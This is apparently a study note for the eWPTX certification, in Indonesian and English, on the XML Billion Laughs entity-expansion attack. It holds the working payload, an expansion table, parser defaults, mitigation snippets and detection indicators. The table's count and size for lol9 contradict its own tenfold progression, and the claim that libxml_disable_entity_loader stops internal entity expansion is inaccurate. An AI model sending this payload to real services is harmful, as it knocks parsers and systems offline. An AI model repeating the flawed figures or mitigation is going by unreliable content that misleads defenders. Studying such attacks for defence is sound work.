2026-02-04 17:55

Status:

Tags: [[eWPTX]] [[XML]]
###### Prasyarat: [[XML External Entities (XXE)]]
# Billion Laughs Attack

## Gambaran singkat

Serangan "Billion Laughs" (CVE-2003-1564) menyalahgunakan ekspansi entity yang rekursif untuk menghabiskan memori/CPU. Dokumen XML kecil (~1KB) bisa mengembang jadi ukuran gigabyte di memori dan membuat parser crash.

Nama lain: **XML Entity Expansion attack**, **exponential entity expansion**.

## Payload klasik

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Perhitungan ekspansi

Setiap level mengalikan level sebelumnya x10:

| Level | Entities   | Teks yang dihasilkan   |
|-------|------------|------------------------|
| lol   | 1          | 3 bytes ("lol")        |
| lol2  | 10         | 30 bytes               |
| lol3  | 100        | 300 bytes              |
| lol4  | 1,000      | 3 KB                   |
| lol5  | 10,000     | 30 KB                  |
| lol6  | 100,000    | 300 KB                 |
| lol7  | 1,000,000  | 3 MB                   |
| lol8  | 10,000,000 | 30 MB                  |
| lol9  | 10^9       | **~3 GB**              |

Ukuran input: ~1 KB. Output setelah ekspansi: ~3 GB. Amplification factor: **~3,000,000x**.

## Perilaku spesifik parser

**libxml2 (Python lxml, PHP)**
- Default entity expansion limit: 10,000 substitutions (since libxml2 2.7+)
- Older versions are fully vulnerable
- PHP `libxml_disable_entity_loader(true)` stops it (deprecated in PHP 8.0, use options instead)

**Java Xerces / JAXP**
- No default limit unless `FEATURE_SECURE_PROCESSING` is enabled
- Without it, JVM will hit `OutOfMemoryError`

**.NET XmlDocument**
- .NET 4.5.2+: `MaxCharactersFromEntities` defaults to 10,000,000
- Older .NET: fully vulnerable, must set `XmlReaderSettings.MaxCharactersFromEntities`

## Contoh mitigasi (kode)

**Python (defusedxml)**
```python
import defusedxml.ElementTree as ET
# Automatically blocks entity expansion, DTD processing
tree = ET.parse("input.xml")
```

**Java (FEATURE_SECURE_PROCESSING)**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
// Also explicitly limit expansion
dbf.setAttribute("http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit", 100);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**PHP (libxml options)**
```php
// PHP < 8.0
libxml_disable_entity_loader(true);

// PHP 8.0+ (use LIBXML_NOENT flag removal)
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // VULNERABLE
$doc->loadXML($xml, 0);  // SAFE - no entity substitution
```

## Indikator deteksi

- Input XML mengandung `<!DOCTYPE` dengan `<!ENTITY` yang nested
- Definisi entity mereferensikan entity lain (pola rekursif)
- Penggunaan memori naik tajam saat parsing
- Log parser menunjukkan warning/limit entity expansion
- Aturan WAF: flag body XML yang punya >3–5 definisi entity yang nested

---

## Diagram

![[Pics/xml/billion-laughs-expansion.svg]]
